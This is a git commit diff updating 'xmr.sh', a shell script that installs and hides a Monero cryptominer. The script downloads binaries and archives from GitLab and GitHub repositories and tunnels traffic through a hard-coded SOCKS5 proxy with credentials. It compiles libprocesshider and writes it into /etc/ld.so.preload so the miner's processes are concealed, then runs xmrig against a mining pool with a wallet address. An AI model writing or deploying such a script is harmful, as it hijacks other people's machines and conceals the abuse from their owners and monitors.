12fb61b6d586f99fdc2438ce696aaf65a2f8e744
oksila54 <124560356+oksila54@users.noreply.github.com>
2023-02-22 11:53:34 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -2,19 +2,11 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-sudo apt-get install -y nodejs
-
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
-
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-
-npm i -g node-process-hider
+apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
 
 wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
-tar -xvzf graphics.tar.gz
 
+tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
@@ -23,9 +15,7 @@ socks5 = 47.254.20.17:443
 socks5_username = duit
 socks5_password = blonjo
 END
-#socks5 = 138.68.100.154:443
-#socks5_username = donat
-#socks5_password = gembul
+
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
@@ -45,9 +35,7 @@ echo ""
 echo " "
 echo " "
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz
-tar -xvzf xmrig-6.19.0-linux-x64.tar.gz
-cd xmrig-6.19.0
+./graftcp/graftcp wget https://github.com/oksila54/mini/raw/main/xmrig
 chmod +x xmrig
 
 ./graftcp/graftcp wget https://github.com/oksila54/mini/raw/main/magicxmrig.zip
@@ -57,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./xmrig -o xmr.2miners.com:2222 -a randomx -u 83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg.$(echo $(shuf -i 1-1000 -n 1)) -t 6
+./graftcp/graftcp ./xmrig -o xmr.2miners.com:2222 -a rx/0 -u 83ewexCY9sah9gKPtPTDeN5FtpwY1kitRRPnWtXHT3QTjfEwaqbTJGYJwHuGr8jUDd5PMmUSLP3cPFnSxHErAZnXMQrhGwg.$(echo $(shuf -i 1-1000 -n 1)) -t 6
